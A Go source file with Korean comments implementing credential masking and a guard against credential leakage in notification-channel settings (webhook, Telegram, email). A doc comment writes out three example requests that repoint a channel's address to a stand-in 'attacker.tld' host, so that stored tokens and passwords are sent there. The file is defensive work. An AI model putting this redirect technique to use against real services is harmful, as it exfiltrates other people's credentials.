package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 는 마스킹 값의 표시 접두사다. API 가 자격 증명을 되돌려 보일 때 이 접두사가 붙은 값으로 실제 내용을 바꾸며,
// 갱신 인터페이스가 이 접두사가 붙은 값을 받으면 「DB 의 원래 값을 그대로 유지」로 이해한다.
//
// 빈 문자열이나 고정 상수가 아니라 접두사를 쓰는 것은 식별 가능한 정보를 조금 함께 담기 위해서다
// (MaskedValue 참고). 그래야 사용자가 키를 다시 붙여 넣지 않고도 「이게 어느 봇인지」 구분할 수 있다.
const MaskedPrefix = "__masked__"

// MaskedValue 는 마스킹 값을 만든다:
//
//	"__masked__"              원래 값이 너무 짧아 아무 힌트도 주지 않음
//	"__masked__:…ab12cd"      원래 값의 끝 6자리를 식별 힌트로 붙임
//
// 끝 6자리만 드러내는 것은 의도적인 선택이다: Webhook 주소의 식별 정보는 끝부분에 있고(예: 위챗 워크의 key,
// 페이슈의 봇 id), 앞부분은 봇마다 같아 식별 가치가 없다. 끝 6자리로는
// 자격 증명을 복원할 수 없지만, 설정한 사람이 「내 그 그룹」임을 알아보기에는 충분하다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 는 어떤 값이 마스킹 값인지(즉 인터페이스가 되돌려 보인 뒤 수정되지 않았는지) 보고한다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 는 설정의 복사본을 반환하며, 그 채널의 자격 증명 필드를 마스킹 값으로 바꾼다.
//
// 알 수 없는 채널 유형은 원래 설정 대신 빈 map 을 반환한다——UI 에 「설정을 사용할 수 없음」이 표시되는 편이,
// 채널 유형을 식별하지 못할 때 자격 증명이 들어 있을 수 있는 원본 내용을 통째로 되돌려 보내는 것보다 낫다.
// 자격 증명이 아닌 필드는 그대로 유지해야 UI 가 정상적으로 표시할 수 있다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 통째로 자격 증명 하나로 처리한다: 하위 키를 하나씩 판단하려면 채널마다
		// 「어떤 하위 키가 자격 증명인지」 규칙을 또 선언해야 하므로, 복잡도가 이득을 훨씬 넘는다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 는 「대상 주소가 바뀌었는데 호출자가
// 자격 증명 필드에 대해 입장을 밝히지 않았다」는 뜻이다. 조용히 통과시키거나 조용히 자격 증명을 버리는 대신 이를 반환하는 이유는 PrepareConfigUpdate 참고.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 바뀐 대상 키
	Missing []string // 명시적으로 입장을 밝히지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")도 함께 다시 입력하세요: 새 값을 입력하거나, 더 이상 자격 증명이 필요 없으면 명시적으로 비워 두세요. " +
		"기존 자격 증명은 이전 주소에만 유효하며, 계속 쓰면 새 주소에 넘기는 것과 같습니다."
}

// PrepareConfigUpdate 는 채널 설정을 병합하며, 「대상 주소 변경」이라는 보안상 민감한 상황을 처리한다.
//
// 채널 갱신 경로에서 순수 MergeConfig 를 대신해 쓰며, 실제로 동작함이 확인된 다음 경로를 막는다:
// 대상 주소(메시지를 어디로 보내는지)와 자격 증명(어떤 신원으로 보내는지)은 서로 독립된 두 필드 묶음인데, MergeConfig 는
// 「언급되지 않은 키」를 모두 DB 의 원래 값으로 유지한다. 그래서 채널을 PATCH 할 수 있는 누구든 **주소만 바꾸고
// 자격 증명은 언급하지 않으면**, 서버가 DB 의 실제 자격 증명을 자기가 제어하는 엔드포인트로 보내게 만들 수 있다:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원래 Authorization 헤더가 요청과 함께 외부로 나감
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<실제Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 후 사용자 이름과 비밀번호를 넘김
//
// 이 경로는 완전히 조용하고 리디렉션에 의존하지 않으며(그래서 교차 호스트 이동 거부로는 막을 수 없다),
// 이 패키지 마스킹 메커니즘의 목표——「자격 증명을 브라우저에 되돌려 보이지 않음」——를 정면으로 무너뜨린다.
//
// 규칙: 어떤 대상 키가 새 값으로 바뀌면, 호출자는 **모든** 자격 증명 키에 대해 명시적으로 입장을 밝혀야 한다:
//   - 새 값을 줌 → 새 값 사용
//   - 빈 문자열을 명시적으로 보냄 → 그 필드는 더 이상 자격 증명이 필요 없음(비우기 의미 유지)
//   - 마스킹 값을 그대로 되돌려 보냄 / 그 키를 아예 언급하지 않음 → 거부
//
// 세 번째도 거부하는 이유는 「마스킹 값」의 의미가 바로 「기존 자격 증명을 그대로 사용」이고, 기존 자격 증명은
// 이전 주소에만 유효하기 때문이다. 여기서는 일부러 「자격 증명 자동 폐기」를 하지 않는다——그러면 선택적 자격 증명 필드
// (webhook 의 headers, email 의 password)에서 조용히 「인증이 사라졌는데 인터페이스는 200 을 반환」하게 되어,
// 오류를 내는 것보다 문제를 찾기 더 어렵다. 차라리 운영자가 한 번 더 입력하게 한다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q 가 등록되지 않았습니다", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(예: webhook 의 headers 는 객체)에 마스킹 리터럴이 박혀 있다면,
	// 호출자가 「원래 값 유지」 센티널을 구조체 안에 넣었다는 뜻이다. MergeConfig 는 「문자열이면서
	// 접두사가 있는 것」만 마스킹으로 인식하므로, 이런 형태는 일반 객체로 그대로 저장된다——DB 에 실제로 리터럴
	// "__masked__" 가 남고, 이후 인증이 아무 오류 없이 조용히 무효가 된다. 차라리 거부한다.
	//
	// 이 검사는 반드시 **맨 앞에** 두어야 한다: 주소가 바뀌지 않으면 일찍 반환하는 경로를 타므로, 뒤에 두면
	// 「주소 변경」 경로 하나만 다루게 된다(첫 버전이 바로 이렇게 잘못 두었고, 테스트가 바로 잡아냈다).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 대상 키를 찾는다. 마스킹 값은 「바뀌지 않음」과 같다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 바뀌지 않았으면 일반 병합을 한다(마스킹 값은 원래 값 유지, 빈 문자열은 비우기, 나머지는 덮어쓰기).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌었으면: 자격 증명 키마다 명시적으로 입장을 밝히도록 요구한다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 는 마스킹 센티널을 문자열이 아닌 구조 안에 넣어 제출하는 것을 거부한다.
//
// 마스킹 메커니즘의 전제는 「값 전체가 문자열 하나」라는 것이다. webhook 의 headers 같은 객체 필드는
// 통째로 마스킹(문자열 "__masked__" 로 씀)하거나 통째로 제출할 수만 있다. 센티널을 객체 안에 넣으면
// 「변경 없음」을 표현하지도 못하고 실제 값으로 DB 에 저장된다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s 의 내용에 마스킹 표시 %q 가 들어 있습니다: 이 필드는 통째로 비워 기존 값을 쓰거나 통째로 새 값을 제출해야 하며, 구조 안에 마스킹 자리표시자를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 는 두 설정 값이 같은지 비교한다. JSON 직렬화로 비교하는 것은 타입 차이도
// 함께 처리하기 위함이다——프론트엔드가 제출한 포트는 number 이고 DB 에서 읽어 온 것은 float64 라, 바로 == 하면 잘못 판단한다.
//
// 「빈 값」은 반드시 먼저 정규화한 뒤 비교해야 한다: 이 설정 모델에서 빈 문자열과 「키 없음」은 같은 상태다.
// MergeConfig 가 빈 문자열을 명시적 비우기로 보고 그 키를 바로 delete 하기 때문이다. 정규화하지 않으면,
// 늘 비워 두는 선택적 대상 필드(Telegram 의 base_url 이 이런 유일한 필드다: 비우면
// 공식 주소를 씀)가 다음 경로를 탄다——
//
//	새로 만들 때 base_url:"" 저장  →  첫 저장에서 MergeConfig 가 키 삭제
//	→ 두 번째 저장 때 incoming 은 "", stored 는 키 없음 → 「주소가 바뀜」으로 판정
//	→ 자격 증명은 마스킹 값 → 400「대상 주소가 변경되었습니다. 자격 증명 필드도 함께 다시 입력하세요」
//
// 이후 저장할 때마다 실패하며, 사용자가 아무것도 바꾸지 않았는데도 Bot Token 을 다시 붙여 넣어야만 한다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 는 설정 값이 「빈 값」인지 판정한다.
// 기준은 반드시 MergeConfig 의 비우기 판정(strings.TrimSpace(s) == "")과 같아야 한다.
// 그렇지 않으면 「MergeConfig 는 지워야 한다고 보고 sameConfigValue 는 값이 있다고 보는」 틈이 생긴다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 는 incoming 을 stored 위에 병합하며, 채널 설정 갱신에 쓴다.
//
// 규칙:
//   - incoming 에서 값이 마스킹인 키 → stored 의 원래 값 유지(사용자가 이 필드를 바꾸지 않음)
//   - incoming 에서 값이 빈 문자열인 키 → 명시적 비우기로 보고 그 키를 삭제
//   - 나머지 키 → incoming 의 값으로 덮어쓰기
//   - stored 에는 있고 incoming 에는 없는 키 → 유지(부분 갱신 의미)
//
// 빈 문자열을 「비우기」로 볼지는 분명히 해야 한다: 프론트엔드 폼은 채우지 않은 필드를 빈 문자열로 제출하므로,
// 이를 유효한 값으로 쓰면 「비워 두어 원래 값을 유지」하려던 필드가 실제로 지워진다.
// 여기서는 명시적 비우기를 택한다. 잘못 설정한 필드를 지우려 할 때 사용자에게 다른 표현 방법이 없기 때문이다
// (필드를 빼면 「제공 안 함」과 「빈 값 제공」을 구분할 수 있지만 UI 에서는 이 차이를 쓰지 않는다).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹 값 = 수정 안 함, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
